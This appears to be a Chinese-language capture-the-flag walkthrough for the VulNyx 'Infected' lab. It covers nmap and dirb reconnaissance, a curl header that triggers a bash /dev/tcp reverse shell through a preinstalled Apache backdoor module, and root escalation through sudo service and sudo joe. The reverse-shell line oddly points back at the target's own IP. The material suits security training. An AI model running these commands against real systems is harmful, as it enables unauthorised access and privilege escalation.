# 环境

来自[vulnyx_Infected](https://vulnyx.com/#Infected)，利用phpinfo已存在加载后门模块，拿到shell

# 信息收集

## 主机发现

```bash
sudo nmap -sn 192.168.88.0/24
```

![image-20240723180651852](image/image-20240723180651852.png)

## 端口扫描

```bash
sudo nmap -sT -r -p- 192.168.88.35
```

![image-20240723180705563](image/image-20240723180705563.png)

## 目录扫描

```bash
dirb http://192.168.88.35
```

![image-20240723181202907](image/image-20240723181202907.png)

# web渗透

## 利用phpinfo()

访问http://192.168.88.35/info.php，查找字符串可以看到Loaded Modules加载了一个mod_backdoor模块

![image-20240723181630012](image/image-20240723181630012.png)

进行反弹shell

```bash
curl -H "Backdoor:bash -c 'bash -i >& /dev/tcp/192.168.88.35/4444 0>&1'" http://192.168.88.35
```

![image-20240723182156895](image/image-20240723182156895.png)

## 提权

可以看到laurent有service权限

![image-20240723182458194](image/image-20240723182458194.png)

进行[service](https://gtfobins.github.io/gtfobins/service/)提权

![image-20240723182645948](image/image-20240723182645948.png)

可也看到laurent用户有root权限执行[joe](https://gtfobins.github.io/gtfobins/joe/)

![image-20240723182711566](image/image-20240723182711566.png)

```bash
sudo joe
然后ctrl+k,输入!
有命令交互输入/bin/bash,成功拿shell
```

![image-20240723182929325](image/image-20240723182929325.png)
